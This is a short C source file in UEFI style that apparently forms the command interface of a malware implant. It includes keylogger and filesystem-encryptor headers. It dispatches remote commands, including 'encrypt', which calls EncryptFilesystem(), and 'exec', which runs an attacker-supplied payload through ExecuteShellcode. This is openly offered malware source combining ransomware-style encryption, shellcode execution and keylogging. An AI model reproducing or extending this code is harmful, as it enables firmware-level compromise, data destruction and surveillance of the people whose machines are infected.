#include "CommandExec.h"
#include "../Shared/Logger.h"
#include "Keylogger.h"
#include "Scheduler.h"
#include "../Encryptor/EncryptFS.h"  // if you want to use it later

STATIC BOOLEAN InterfaceReady = FALSE;

BOOLEAN StartCommandInterface(void) {
    InterfaceReady = TRUE;
    LogInfo(L"Command interface ready\n");
    return TRUE;
}

VOID ProcessCommand(CHAR16* Cmd) {
    if (!InterfaceReady || Cmd == NULL) return;

    if (StrCmp(Cmd, L"ping") == 0) {
        LogInfo(L"Ping received\n");
    }
    else if (StrCmp(Cmd, L"disablekeylog") == 0) {
        LogInfo(L"Keylogger disabled\n");

    }
    else if (StrCmp(Cmd, L"encrypt") == 0) {
        LogInfo(L"ok\n");
        EncryptFilesystem();  
    }
    else if (StrnCmp(Cmd, L"exec ", 5) == 0) {
        CHAR16* Payload = Cmd + 5;
        LogInfo(L"executing payload\n");
        ExecuteShellcode(Payload);  
    }
    else {
        LogWarning(L"Unknown command received\n");
    }
}
